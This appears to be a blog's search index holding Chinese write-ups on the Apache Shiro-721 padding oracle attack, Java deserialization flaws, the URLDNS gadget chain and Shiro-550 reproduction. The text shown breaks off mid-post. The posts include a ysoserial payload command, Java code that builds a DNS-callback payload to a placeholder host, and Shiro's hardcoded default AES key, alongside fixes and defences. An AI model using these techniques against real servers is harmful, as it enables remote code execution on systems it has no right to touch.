<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Padding Oracle Attack(Shiro-721)漏洞复现</title>
    <link href="/2021/10/14/Padding-Oracle-Attack-Shiro-721-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/10/14/Padding-Oracle-Attack-Shiro-721-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p>由于Shiro cookie中通过AES/CBC/PKCS5加密rememberMe字段，攻击者可以控制rememberMe字段的前16字节（IV），通过Padding Oracle攻击来构造恶意的rememberMe字段，进行反序列化攻击，最终导致任意代码执行。</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>Apache Shiro &lt;1.42</p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>Shiro-721漏洞是因为使用AES/CBC/PKCS5导致了<strong>Padding Oracle</strong> 攻击，下面详细介绍Padding Oracle Attack(填充提示攻击)</p><h2 id="Padding-Oracle-Attack"><a href="#Padding-Oracle-Attack" class="headerlink" title="Padding Oracle Attack"></a>Padding Oracle Attack</h2><p>该漏洞存在条件如下：</p><ol><li>攻击者获取密文，IV（初始向量，rememberMe字段的前16字节）。</li><li>修改密文并且触发解密操作，解密成功和解密失败存在差异性。</li></ol><h3 id="1-分组密码的填充"><a href="#1-分组密码的填充" class="headerlink" title="1. 分组密码的填充"></a>1. 分组密码的填充</h3><p>AES、DES在加密时一般会采用分组加密，将明文进行分组，常见的64bit、128bit、256bit。</p><p>分组带来一个问题，就是明文不可能恰好是block的整数倍，对于不能整除剩余的部分数据就涉及到填充操作。</p><p>常用的填充操作有PKCS5和PKCS7，在最后一个block中将不足的bit位数作为bit值进行填充，例如最后一个分组（block）缺少3个bit，就填充3个0x03到结尾，缺少n个bit，就填充n个0x0n。在解密时会校验明文的填充是否满足该规则，如果是以N个0x0N结束，则意味着解密操作执行成功，否则解密操作失败。</p> <img src="/2021/10/14/Padding-Oracle-Attack-Shiro-721-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/0.png" class=""><h3 id="2-CBC模式密码算法"><a href="#2-CBC模式密码算法" class="headerlink" title="2. CBC模式密码算法"></a>2. CBC模式密码算法</h3><p>分组密码算法有四种模式，分别是ECB、CBC、CFB和OFB，其中CBC是IPSEC的标准做法，CBC主要是引入一个初始化向量（IV）来加强密文的随机性，保证相同明文通过相同的密钥加密的结果不一样。</p><p><strong>CBC加密过程:</strong> </p> <img src="/2021/10/14/Padding-Oracle-Attack-Shiro-721-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/1.png" class=""><ol><li>明文经过填充后，分为不同的组block，以组的方式对数据进行处理 </li><li>初始化向量（IV）首先和第一组明文进行XOR（异或）操作，得到”中间值“</li><li>采用密钥对中间值进行块加密，删除第一组加密的密文 （加密过程涉及复杂的变换、移位等） </li><li>第一组加密的密文作为第二组的初始向量（IV），参与第二组明文的异或操作  </li><li>依次执行块加密，最后将每一块的密文拼接成密文  </li></ol><p><strong>由于初始化向量（IV）每次加密都是随机的，所以IV经常会被放在密文的前面，解密时先获取前面的IV，再对后面的密文进行解密</strong></p><p><strong>CBC解密过程:</strong></p> <img src="/2021/10/14/Padding-Oracle-Attack-Shiro-721-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/2.png" class=""><ol><li>会将密文进行分组（按照加密采用的分组大小），前面的第一组是初始化向量，从第二组开始才是真正的密文</li><li>使用加密密钥对密文的第一组进行解密，得到”中间值“  </li><li>将中间值和初始化向量进行异或，得到该组的明文</li><li>前一块密文是后一块密文的IV，通过异或中间值，得到明文</li><li>块全部解密完成后，拼接得到明文，密码算法校验明文的格式（填充格式是否正确）</li><li>校验通过得到明文，校验失败得到密文 </li></ol><h3 id="3-padding-oracle-attack破解密文的明文"><a href="#3-padding-oracle-attack破解密文的明文" class="headerlink" title="3. padding oracle attack破解密文的明文"></a>3. padding oracle attack破解密文的明文</h3><p>此处以一个例子进行猜解，假设有这样一个应用，请求如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://www.example.com/decrypt.jsp?data=<span class="hljs-number">7</span>B<span class="hljs-number">216</span>A<span class="hljs-number">634951170</span>FF<span class="hljs-number">851</span>D<span class="hljs-number">6</span>CC<span class="hljs-number">68</span>FC<span class="hljs-number">9537858795</span>A<span class="hljs-number">28</span>ED<span class="hljs-number">4</span>AAC<span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><p>现在让我们来看看在不知道明文的情况下，如何猜解处明文。首先我们将密文分组，前面8个字节为初始化向量，后面16个字节为加密后的数据：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tap">初始化向量： 7B <span class="hljs-number"> 21 </span> 6A <span class="hljs-number"> 63 </span><span class="hljs-number"> 49 </span><span class="hljs-number"> 51 </span><span class="hljs-number"> 17 </span> 0F<br>第一组密文： F8 <span class="hljs-number"> 51 </span> D6  CC <span class="hljs-number"> 68 </span> FC <span class="hljs-number"> 95 </span> 37<br>第二组密文：<span class="hljs-number"> 85 </span><span class="hljs-number"> 87 </span><span class="hljs-number"> 95 </span> A2  8E  D4  AA  C6<br></code></pre></td></tr></table></figure><p>首先我们破解第一组密文<code>http://www.example.com/decrypt.jsp?data=7B216A634951170FF851D6CC68FC9537</code>通过构造前面初始向量即可破解出第一组密文的明文 </p><ol><li><p>将初始化向量全部设置为0，提交如下请求<code>http://www.example.com/decrypt.jsp?data=00000000000000000F851D6CC68FC9537</code> ，服务器势必会解密失败，返回HTTP 500，那是因为在对数据进行解密的时候，明文最后一个字节的填充是Ox3D,不满足填充规则，校验失败，此时示意图如下：</p> <img src="/2021/10/14/Padding-Oracle-Attack-Shiro-721-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/3.png" class=""></li><li><p>依次将初始化向量最后一个字节从0x01~0xFF递增，直到解密的明文最后一个字节为0x01，成为一个正确的padding，当初始化向量为<code>000000000000003C</code>时，成功了，服务器返回HTTP 200，解密示意图如下：</p> <img src="/2021/10/14/Padding-Oracle-Attack-Shiro-721-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/4.png" class=""></li><li><p>我们已知构造成功的IV最后一个字节为0x3C，最后一个填充字符为0x01，则我们能通过异或XOR计算出，第一组密文解密后的中间值最后一个字节：0x01 xor 0x3C = 0x3D;<br><strong>重点：第一组密文解密的中间值是一直不变的，同样也是正确的，我们通过构造IV值，使得最后一位填充值满足0x01，符合padding规则，则意味着程序解密成功（当前解密的结果肯定不是原来的明文），通过循环测试的方法，猜解出中间值得最后一位，再利用同样的方式猜解前面的中间值，直到获取到完整的中间值</strong></p></li><li><p>下面我们将构造填充值为0x02 0x02的场景，即存在2个填充字节，填充值为0x02，此时我们已经知道了中间值得最后一位为0x3D,计算出初始向量的最后一位为 0x3D xor 0x02 = 0x3F, 即初始向量为<code>0000000000000003F</code>，遍历倒数第二个字节从0x00~0xFF，直到响应成功，示例图如下：</p> <img src="/2021/10/14/Padding-Oracle-Attack-Shiro-721-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/5.png" class=""><p>此时，我们猜解出中间值得后两个字节分别为 0x26 0x3D</p></li><li><p>通过同样的方式，完成第一组密文中间值得猜解</p> <img src="/2021/10/14/Padding-Oracle-Attack-Shiro-721-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/6.png" class=""></li><li><p>当第一组密文的中间值猜解成功后，我们将中间值和已知的IV做异或，则得到第一组密文的明文</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-number">0</span>x39 <span class="hljs-number">0</span>x73 <span class="hljs-number">0</span>x23 <span class="hljs-number">0</span>x22 <span class="hljs-number">0</span>x07 <span class="hljs-number">0</span>x6A <span class="hljs-number">0</span>x26 <span class="hljs-number">0</span>x3D <br><span class="hljs-built_in">xor</span> <br><span class="hljs-number">0</span>x7B <span class="hljs-number">0</span>x21 <span class="hljs-number">0</span>x6A <span class="hljs-number">0</span>x63 <span class="hljs-number">0</span>x49 <span class="hljs-number">0</span>x51 <span class="hljs-number">0</span>x17 <span class="hljs-number">0</span>x0F<br>= <br>BRIAN;<span class="hljs-number">12</span><br></code></pre></td></tr></table></figure></li><li><p>继续破解第二组密文，第二组密文的IV向量是第一组密文，随意按照上述的逻辑构造第一组密文，即可破解出第二组明文。</p></li></ol><h3 id="4-伪造明文的密文"><a href="#4-伪造明文的密文" class="headerlink" title="4. 伪造明文的密文"></a>4. 伪造明文的密文</h3><p>在不知道密钥的情况下，完成数据的加密，绕过服务端的校验（解密成功+明文有效），达到攻击的目的；<br>伪造明文其实就是上面猜解逆向的过程。通过遍历密文+已知的IV+Padding来确定伪造的密文。</p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><ol><li>更新版本Apache Shior到最新版本</li><li>关闭rememberMe持久化登录功能</li><li>临时防范建议：<ul><li>拦截Cookie中长度过大的rememberMe值</li><li>拦截访问过于频繁的IP, 因为该漏洞需要爆破Cookie</li></ul></li></ol><h2 id="官方修复方案"><a href="#官方修复方案" class="headerlink" title="官方修复方案"></a>官方修复方案</h2><p>在&gt;=1.4.2版本中，官方对Shiro-721漏洞做了修复。</p><h3 id="1-4-1-版本-有漏洞版本"><a href="#1-4-1-版本-有漏洞版本" class="headerlink" title="1.4.1 版本(有漏洞版本)"></a>1.4.1 版本(有漏洞版本)</h3><p><code>AesCipherService</code>类中设置使用的加密算法</p> <img src="/2021/10/14/Padding-Oracle-Attack-Shiro-721-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/7.png" class=""><p>设置加密算法采用AES，其父类<code>AbstractSymmetricCipherService</code>指定了加密模式及填充方式为<strong>CBC/PKCS5</strong></p> <img src="/2021/10/14/Padding-Oracle-Attack-Shiro-721-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/8.png" class=""><h3 id="1-4-2-版本-修复版本"><a href="#1-4-2-版本-修复版本" class="headerlink" title="1.4.2 版本(修复版本)"></a>1.4.2 版本(修复版本)</h3><p><code>AesCipherService</code>类，加密方式由<strong>CBC</strong>更换为<strong>GCM</strong></p><img src="/2021/10/14/Padding-Oracle-Attack-Shiro-721-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/9.png" class=""><h3 id="1-8-0-版本-2021-8-24版本"><a href="#1-8-0-版本-2021-8-24版本" class="headerlink" title="1.8.0 版本(2021-8-24版本)"></a>1.8.0 版本(2021-8-24版本)</h3><p><code>AesCipherService</code>类，加密方式为<strong>GCM</strong>并设置填充方式为<strong>NoPadding</strong></p> <img src="/2021/10/14/Padding-Oracle-Attack-Shiro-721-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/10.png" class=""><h2 id="CBC与GCM加密模式区别"><a href="#CBC与GCM加密模式区别" class="headerlink" title="CBC与GCM加密模式区别"></a>CBC与GCM加密模式区别</h2><ol><li><p>AES/GCM是流加密的模式，不需要对明文进行填充。AES/CBC是块加密的模式，需要对明文进行填充。</p></li><li><p>AES/CBC中必须要用到padding，导致最后一个明文块与其他密文块不同，因此可能会受到padding Oracle attacks，从而可以直接通过初始向量IV和密码，即可得到明文。</p></li><li><p>AES/GCM可以并行加密解密，AES/CBC的模式决定了它只能串行地进行加密。因为加密是耗时较久的步骤。</p></li><li><p>AES/GCM提供了GMAC信息校验码，用以校验密文的完整性。AES/CBC没有，无法有效地校验密文的完整性。</p></li><li><p>AES/GCM中进行AES加密的是counter，AES/CBC中进行AES加密的是明文块。</p></li></ol><p>GCM(GMAC Counter Mode)，使用了Counter的模式，并且带有GMAC消息认证码，因为GCM是基于CTR(Counter Mode)的，所以以下介绍CTR Mode：</p> <img src="/2021/10/14/Padding-Oracle-Attack-Shiro-721-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/11.png" class=""><p>从上图可知，在CTR模式中，不再对明文进行加密，而是对一个逐次累加的计数器进行加密，用加密后得到的比特序列与明文分组进行异或，得到每一个明文块的密文。计数器的初始值，是依据于一个nonce的。<br>因为计数器是递增的，所以加密得到的比特序列是不同的，再与明文进行异或，可以避免相同的明文块被加密成一样的密文块。<br>因为每一个明文块的加密都是独立的，不依赖于其他明文块，所以CTR模式的AES加密是可以并行地对明文块进行加密的，并且不会有错误传播的现象。<br>以下为CTR解密模式：<br> <img src="/2021/10/14/Padding-Oracle-Attack-Shiro-721-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/12.png" class=""></p><p>CTR的解密也是较为直接的。直接对计数器进行加密，得到比特序列，再和对应的密文块进行异或，就可以得到相应的明文块。<br>因为CTR模式下的AES加密是针对计数器进行加密的，所以CTR模式是不需要padding的。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p><a href="https://github.com/AonCyberLabs/PadBuster">padbuster</a></p><p><a href="https://github.com/longofo/PaddingOracleAttack-Shiro-721">PaddingOracleAttack-Shiro-721</a></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.jianshu.com/p/833582b2f560">https://www.jianshu.com/p/833582b2f560</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shiro</tag>
      
      <tag>Padding Oracle</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反序列化漏洞</title>
    <link href="/2021/10/13/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/10/13/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="1-什么是java序列化与反序列化？"><a href="#1-什么是java序列化与反序列化？" class="headerlink" title="1.什么是java序列化与反序列化？"></a>1.什么是java序列化与反序列化？</h2> <img src="/2021/10/13/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/images/1.png" class=""><h3 id="1-1-序列化"><a href="#1-1-序列化" class="headerlink" title="1.1 序列化"></a>1.1 序列化</h3><p>Java 序列化是指把 Java 对象转换为字节序列的过程，以便于保存在内存、文件、数据库中，<br>例如：json序列化、XML序列化、二进制序列化、SOAP序列化、对象持久化存储（服务重启当前用户操作序列化保存到磁盘）</p><p><strong>java.io.ObjectOutputStream</strong> 类中的**writeObject()**可以实现序列化。</p><h3 id="1-2-反序列化"><a href="#1-2-反序列化" class="headerlink" title="1.2 反序列化"></a>1.2 反序列化</h3><p>Java 反序列化是指把字节序列恢复为 Java 对象的过程。<br><strong>java.io.ObjectInputStream</strong> 类中的 **readObject()**方法用于反序列化。</p><h3 id="1-3-序列化条件"><a href="#1-3-序列化条件" class="headerlink" title="1.3 序列化条件"></a>1.3 序列化条件</h3><p>实现<strong>Serializable</strong>和<strong>Externalizable</strong>接口的类的对象才能被序列化。</p><h2 id="2-漏洞原理"><a href="#2-漏洞原理" class="headerlink" title="2.漏洞原理"></a>2.漏洞原理</h2><p>如果Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。</p><h2 id="3-漏洞危害"><a href="#3-漏洞危害" class="headerlink" title="3.漏洞危害"></a>3.漏洞危害</h2><p>导致代码执行、文件操作、执行数据库操作等不可控后果</p><h2 id="4-漏洞发现"><a href="#4-漏洞发现" class="headerlink" title="4.漏洞发现"></a>4.漏洞发现</h2><p>存在于 WebLogic、WebSphere、JBoss、Jenkins、OpenNMS 等等</p><ol><li>HTTP请求中的参数，cookies以及Parameters。</li><li>RMI协议，被广泛使用的RMI协议完全基于序列化</li><li>JMX 同样用于处理序列化对象</li><li>自定义协议 用来接收与发送原始的java对象</li></ol><h2 id="5-漏洞挖掘"><a href="#5-漏洞挖掘" class="headerlink" title="5.漏洞挖掘"></a>5.漏洞挖掘</h2><ul><li><p>确定反序列化输入点</p><p> 首先应找出readObject方法调用，在找到之后进行下一步的注入操作。一般可以通过以下方法进行查找：</p><ol><li><p>源码审计：寻找可以利用的“靶点”，即确定调用反序列化函数readObject的调用地点。</p></li><li><p>对该应用进行网络行为抓包，寻找序列化数据，如wireshark,tcpdump等</p></li></ol></li><li><p>黑盒流量分析</p><p>  在Java反序列化传送的包中，一般有两种传送方式，在TCP报文中，一般二进制流方式传输，在HTTP报文中，则大多以base64传输。因而在流量中有一些特征：</p><ol><li>TCP：必有aced0005，这个16进制流基本上也意味者java反序列化的开始；</li><li>HTTP：必有rO0AB，其实这就是aced0005的base64编码的结果；</li></ol><p>  以上意味着存在Java反序列化，可尝试构造payload进行攻击。</p></li><li><p>java的RMI</p><p>  RMI是java的一种远程对象（类）调用的服务端，默认于1099端口，基予socket通信，该通信实现远程调用完全基于序列化以及反序列化。</p><ol><li>白盒代码审计<ul><li>观察实现了Serializable接口的类是否存在问题。</li><li>观察重写了readObject方法的函数逻辑是否存在问题。</li></ul></li></ol><p>  再考察应用的Class Path中是否包含Apache Commons Collections库</p></li></ul><h2 id="6-漏洞防御"><a href="#6-漏洞防御" class="headerlink" title="6. 漏洞防御"></a>6. 漏洞防御</h2><ul><li><p>通过Hook resolveClass来校验反序列化的类</p><p>  在readObject反序列化时首先会调用resolveClass读取反序列化的类名，所以这里通过重写ObjectInputStream对象的resolveClass方法即可实现对反序列化类的校验</p></li><li><p>类的白名单校验机制，对所有传入的反序列化对象，在反序列化过程开始前，对类型名称做一个检查，不符合白名单的类不进行反序列化操作</p></li><li><p>禁止JVM执行外部命令Runtime.exec，可以通过扩展 SecurityManager 可以实现</p></li><li><p>使用ObjectInputFilter来校验反序列化的类</p><p>  Java 9包含了支持序列化数据过滤的新特性，开发人员也可以继承<strong>java.io.ObjectInputFilter</strong>类重写<strong>checkInput</strong>方法实现自定义的过滤器，，并使用<strong>ObjectInputStream</strong>对象的<strong>setObjectInputFilter</strong>设置过滤器来实现反序列化类白/黑名单控制</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>反序列化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>URLDNS利用链</title>
    <link href="/2021/10/13/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/"/>
    <url>/2021/10/13/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p>在一些漏洞没有回显的时候可以采用DNSLog来验证漏洞是否存在，下面将分析该利用链接</p><h2 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h2><h3 id="使用ysoserial生成序列化后的payload"><a href="#使用ysoserial生成序列化后的payload" class="headerlink" title="使用ysoserial生成序列化后的payload"></a>使用ysoserial生成序列化后的payload</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>ysoserial.<span class="hljs-keyword">jar </span> URLDNS <span class="hljs-string">&quot;http://xxxx.ceye.io&quot;</span><br></code></pre></td></tr></table></figure><h3 id="编写代码生成payload"><a href="#编写代码生成payload" class="headerlink" title="编写代码生成payload"></a>编写代码生成payload</h3><ol><li>创建URL对象</li><li>put到hashmap中</li><li>反射修改URL对象的hashCode为-1</li></ol><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap hashMap =  <span class="hljs-keyword">new</span> HashMap();<br>String url = <span class="hljs-string">&quot;http://xxx.ceye.io&quot;</span><br>URL u = <span class="hljs-keyword">new</span> URL(url);<br>hashMap.put(u,url);<br>Field hashCodeField =  u.getClass().getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>hashCodeField.setAccessible(<span class="hljs-keyword">true</span>);<br>hashCodeField.set(u, -<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>Gadget Chain:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-constructor">Val()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br>      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URL</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br>       <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URLStreamHandler</span>.</span></span>hash<span class="hljs-constructor">Code()</span>.getHostAddress<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URLStreamHandler</span>.</span></span>hash<span class="hljs-constructor">Code()</span>.getHostAddress.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InetAddress</span>.</span></span>getByName<br></code></pre></td></tr></table></figure><p>序列化时，hashmap重写readObject方法,该方法最终会调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">false</span>);<br><br></code></pre></td></tr></table></figure><p>进入hash方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hash</span><span class="hljs-params">(Object key)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> h;<br>    <span class="hljs-keyword">return</span> (key == <span class="hljs-keyword">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>根据hashCode计算key的hash，因为key为URL对象，所以调用URL.hashCode(),代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hashCode</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> hashCode;<br><br>    hashCode = handler.hashCode(<span class="hljs-keyword">this</span>);<br>    <span class="hljs-keyword">return</span> hashCode;<br>&#125;<br></code></pre></td></tr></table></figure><p>因为URL的hashCode已经通过反射设置为-1，代码会走 handler.hashCode,代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hashCode</span><span class="hljs-params">(URL u)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> h = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// 获取协议</span><br>    String protocol = u.getProtocol();<br>    <span class="hljs-keyword">if</span> (protocol != <span class="hljs-keyword">null</span>)<br>        h += protocol.hashCode();<br><br>    <span class="hljs-comment">//获取主机ip地址，此处会通过host获取IP地址，触发dns请求</span><br>    InetAddress addr = getHostAddress(u);<br>    <span class="hljs-keyword">if</span> (addr != <span class="hljs-keyword">null</span>) &#123;<br>        h += addr.hashCode();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        String host = u.getHost();<br>        <span class="hljs-keyword">if</span> (host != <span class="hljs-keyword">null</span>)<br>            h += host.toLowerCase().hashCode();<br>    &#125;<br><br>    <br>    ........<br><br>    <span class="hljs-keyword">return</span> h;<br>&#125;  <br>    <br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>因为hashmap重写readObject方法，readObject又调用了putVal导致了URLDNS利用链。URLDNS本身不依赖第三方包且调用简单，仅能做漏洞探测，不能做到漏洞利用。</p>]]></content>
    
    
    <categories>
      
      <category>反序列化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>反序列化</tag>
      
      <tag>DNSlog注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shiro550漏洞复现</title>
    <link href="/2021/10/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/10/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>shiro框架可以实现自动登录，当用户选择开启免登录功能时，shiro会自动对用户对象序列化并加密，通过<strong>Set-Cookie: rememberMe</strong>发送给客户端。</p><p>当用户下次访问网站时，如果存在cookie <strong>rememberMe</strong>，在过滤器中会对该字段的值进行解密，来判断是否是合法免登录用户，服务端处理<strong>rememberMe</strong>流程：</p><ol><li>获取rememberMe cookie值</li><li>BASE64解码</li><li>取前16位作为AES解密的IV</li><li>取[16:]作为待解密数据</li><li>通过硬编码密钥<strong>kPH+bIxk5D2deZiIxcaaaA==</strong>+IV使用AES/CBC/pkcs5解密(&gt;1.4.1版本采用AES/GCM)</li><li>反序列化解密后数据</li></ol><p>因为AES是<strong>硬编码</strong>，导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Shiro &lt;= 1.2.4</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>核心类：</p><ul><li><p>RememberMeManager （接口类，定义了处理rememberMe的接口）</p></li><li><p>AbstractRememberMeManager （实现RememberMeManager接口）</p></li><li><p>CookieRememberMeManager  （AbstractRememberMeManager的子类）</p></li><li><p>JcaCipherService （数据加解密类）</p></li><li><p>DefaultSerializer （序列化/反序列化类）</p></li></ul><p><strong>OncePerRequestFilter</strong>类的<strong>doFilter</strong>方法为shiro过滤器</p> <img src="/2021/10/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/1.png" class=""><p>最后会调用<strong>AbstractRememberMeManager</strong>的<strong>getRememberedPrincipals</strong>方法来处理<strong>rememberMe</strong>的值</p> <img src="/2021/10/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/2.png" class=""><p>调用子类<strong>CookieRememberMeManager</strong>的<strong>getRememberedSerializedIdentity</strong>方法将rememberMe的值进行BASE64解码</p> <img src="/2021/10/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/3.png" class=""><p>调用<strong>convertBytesToPrincipals</strong>方法对base64解码后的数据解密、反序列化</p> <img src="/2021/10/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/4.png" class=""><p>在解密流程中调用了<strong>JcaCipherService</strong>的<strong>decrypt</strong>方法</p> <img src="/2021/10/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/5.png" class=""><p>入参<strong>ciphertext</strong>为解码后的数据，<strong>key</strong>为密钥KEY，硬编码在<strong>AbstractRememberMeManager</strong>类中</p> <img src="/2021/10/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/6.png" class=""><p>最后调用<strong>JcaCipherService</strong>的<strong>crypt</strong>方法完成解密</p> <img src="/2021/10/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/7.png" 